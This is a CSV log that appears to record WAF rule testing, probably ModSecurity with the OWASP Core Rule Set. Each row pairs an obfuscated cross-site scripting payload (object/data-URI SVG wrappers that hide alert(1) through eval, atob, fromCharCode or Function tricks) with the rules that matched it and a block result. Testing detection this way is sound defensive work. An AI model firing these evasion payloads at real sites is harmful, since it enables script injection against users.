1823,"<object data=""data:text/html,<svg onload=Function.prototype.constructor('al'+'ert(1)')()>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,8v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,89v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,41v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,100t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826759344.894754
1829,"<object data=""data:text/html,<svg onload=window['Function']['prototype']['constructor']['call'](null,'al'+'ert(1)')()>""></object>",0,1,block,10,"933210,941100,941120,941130,941140,941160,941170,941300,941370,949110","o47,70v217,129t:urlDecode,t:replaceComments,t:compressWhitespace || v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,8v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,118v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,41v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,18v217,129t:urlDecodeUni,t:compressWhitespace || ",45,177826760643.841449
1852,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script></svg>'></object>",0,1,block,10,"933160,934100,941100,941110,941130,941140,941160,941170,941300,949110","o77,54v217,157 || o77,5v217,157 || v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,157t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,177826765739.155605
1854,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>window[""ev\u0061l""](atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,9,"941100,941110,941130,941140,941160,941170,941300,941370,949110","v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,144t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,19v217,144t:urlDecodeUni,t:compressWhitespace || ",40,177826766129.364426
1858,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval.call(null,atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826767097.449115
1860,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>globalThis[atob(""ZXZhbA=="")](atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826767477.340507
1863,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval?.call?.(null,atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826768143.731792
1864,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>window.eval.apply(null,[atob(""YWxlcnQoMSk="")])</script></svg>'></object>",0,1,block,8,"941100,941110,941130,941140,941160,941170,941300,949110","v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,149t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826768343.767843
1866,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval/**//**/(atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,9,"933160,941100,941110,941130,941140,941160,941170,941300,949110","o77,34v217,137 || v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826768773.121153
1868,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval(String.fromCharCode(97)+atob(""bGVydCgxKQ==""))</script></svg>'></object>",0,1,block,11,"933160,934100,934100,941100,941110,941130,941140,941160,941170,941300,949110","o77,50v217,153 || o77,5v217,153 || o77,5v217,153t:urlDecodeUni || v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,153t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177826769115.032090
1870,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>with(this)eval(atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,10,"933160,934100,941100,941110,941130,941140,941160,941170,941300,949110","o87,26v217,139 || o87,5v217,139 || v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,139t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,17782676966.912185
1871,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>({e:eval}).e(atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,9,"932130,941100,941110,941130,941140,941160,941170,941300,949110","o73,33v217,137t:urlDecodeUni,t:cmdLine || v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,69v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,137t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826769846.440144
1872,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='window[&quot;ev&quot;+&quot;al&quot;](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,9,"941100,941120,941130,941140,941160,941170,941300,941370,949110","v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,128v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,185t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,37v217,185t:urlDecodeUni,t:compressWhitespace || ",40,177826770076.083628
1873,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='Function(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,121v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826770223.217381
1875,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='[].constructor.constructor(&quot;al&quot;+&quot;ert(1)&quot;)()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,139v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,176t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826770736.400616
1876,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='setTimeout(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,121v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,158t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17782677099.205116
1877,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='setInterval(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,122v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,159t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826771140.066573
1878,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='(1,eval)(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,119v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,156t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826771447.122198
1880,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='self[String.fromCharCode(101,118,97,108)](&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"934100,934100,941100,941120,941130,941140,941160,941170,941300,941370,949110","o99,19v217,189 || o99,19v217,189t:urlDecodeUni || v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,152v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,189t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,41v217,189t:urlDecodeUni,t:compressWhitespace || ",50,177826771872.476712
1882,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='with(window)eval(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"933160,934100,934100,941100,941120,941130,941140,941160,941170,941300,949110","o106,39v217,164 || o106,5v217,164 || o106,5v217,164t:urlDecodeUni || v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,127v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,164t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",50,177826772346.952595
1883,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='location=&quot;javascript:al&quot;+&quot;ert(1)&quot;'></svg>""></object>",0,1,block,9,"941100,941120,941130,941140,941160,941170,941210,941300,949110","v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,129v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o104,12v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,166t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",40,177826772587.072086
1884,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='[&quot;ale&quot;+&quot;rt&quot;][0]in window?window[&quot;ale&quot;+&quot;rt&quot;](1):0'></svg>""></object>",0,1,block,9,"941100,941120,941130,941140,941160,941170,941300,941370,949110","v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,144v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,201t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o139,38v217,201t:urlDecodeUni,t:compressWhitespace || ",40,177826772737.178460
1885,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='Reflect.apply(eval,null,[&quot;al&quot;+&quot;ert(1)&quot;])'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,136v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,173t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826772970.153928
1886,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='Reflect.construct(Function,[&quot;al&quot;+&quot;ert(1)&quot;])()'></svg>""></object>",0,1,block,8,"941100,941120,941130,941140,941160,941170,941300,949110","v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o85,8v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,141v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,93v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v217,178t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,177826773189.743595
